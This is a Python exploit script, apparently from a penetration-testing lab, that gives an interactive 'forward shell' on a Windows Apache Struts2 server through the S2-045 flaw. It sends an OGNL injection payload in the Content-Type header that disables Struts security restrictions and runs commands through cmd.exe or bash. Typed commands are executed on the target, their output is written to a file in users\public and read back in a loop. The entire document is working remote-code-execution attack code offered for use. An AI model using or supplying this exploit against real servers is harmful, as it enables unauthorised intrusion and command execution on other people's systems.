#!/usr/bin/python3 
# -*- coding: utf-8 -*- 
# Windows AS-045 Forward Shell
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY 
# Authors: ippsec, 0xdf
# Adapted for windows target by: m4ud

import base64 
import random 
import requests 
import threading 
import time
import os

class WebShell(object): 
    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp 
    def __init__(self, interval=1.3, proxies='http://127.0.0.1:8080'): 
        # MODIFY THIS, URL 
        self.url = r"http://10.11.1.109:8080/struts2-rest-showcase/orders/3" 
        self.proxies = {'http' : proxies} 
        session = random.randrange(10000,99999) 
        print(f"\r\n[*] (m4ud) Windows AS-045 Forward-shell\r\n")
        print(f"[*] Session ID: {session}") 
        self.stdout = f'\\\\users\\\\public\\\\output.{session}' 

        self.interval = interval 
        # set up shell 
        print("[*] Setting up output file!") 
        MakeNamedPipes = f"break >{self.stdout}"
        self.RunRawCmd(MakeNamedPipes, timeout=0.1) 
        # set up read thread 
        print("[*] Setting up read thread")

        self.interval = interval 
        thread = threading.Thread(target=self.ReadThread, args=()) 
        thread.daemon = True 
        thread.start() 
    # Read $session, output text to screen & wipe session 
    def ReadThread(self):
        CF = f"break > {self.stdout}"
        GetOutput = f"type {self.stdout}"
        result = self.RunRawCmd(CF)
        while True: 
            result = self.RunRawCmd(GetOutput) #, proxy=None) 
            if result: 
                print(result) 
                ClearOutput = f'break > {self.stdout}' 
                self.RunRawCmd(ClearOutput) 
            time.sleep(self.interval) 
         
    # Execute Command. 
# Execute Command. 
    def RunRawCmd(self, cmd, timeout=50, proxy='http://127.0.0.1:8080'):

#print(f"Going to run cmd: {cmd}") 
        payload = "%{(#_='multipart/form-data')." 
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." 
        payload += "(#_memberAccess ?" 
        payload += "(#_memberAccess=#dm):" 
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." 
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." 
        payload += "(#ognlUtil.getExcludedPackageNames().clear())." 
        payload += "(#ognlUtil.getExcludedClasses().clear())." 
        payload += "(#context.setMemberAccess(#dm))))." 
        payload += "(#cmd='%s')." % cmd 
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." 
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." 
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))." 
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())." 
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." 
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." 
        payload += "(#ros.flush())}"
        #print(f"Going to run cmd: {cmd}") 
        # MODIFY THIS: This is where your payload code goes 
        if proxy: 
            proxies = self.proxies 
        else: 
            proxies = {} 
        
        # MODIFY THIS: Payload in User-Agent because it was used in ShellShock 
        headers = {'User-Agent': 'm4ud', 'Content-Type': payload} 
        try: 
            r = requests.get(self.url, headers=headers, timeout=timeout) 
            return r.text 
        except: 
            pass 
             
    # Send b64'd command to RunRawCommand 
    def WriteCmd(self, cmd): 
        stage_cmd = f'{cmd} > {self.stdout}' 
        self.RunRawCmd(stage_cmd) 
        time.sleep(self.interval * 1.1) 
prompt = "(m4udSec) cmd > " 
S = WebShell() 

while True: 
    cmd = input(prompt)
    if cmd == "bye":
        promt = ""
        exit()
    else:
        S.WriteCmd(cmd)

